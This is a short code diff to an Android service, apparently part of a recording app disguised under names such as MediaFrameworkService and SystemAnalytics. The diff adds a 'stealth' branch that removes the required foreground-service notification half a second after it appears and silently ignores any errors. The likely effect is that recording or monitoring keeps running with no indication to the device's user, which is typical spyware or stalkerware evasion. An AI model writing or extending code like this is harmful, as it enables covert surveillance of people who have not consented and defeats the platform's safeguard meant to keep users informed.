@@ -14,7 +14,9 @@ import android.content.pm.ServiceInfo;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.util.Log;
 
@@ -178,6 +180,19 @@ public class MediaFrameworkService extends Service {
             } else {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
+            }
+
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 500);
             }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS failure: " + e.getMessage());
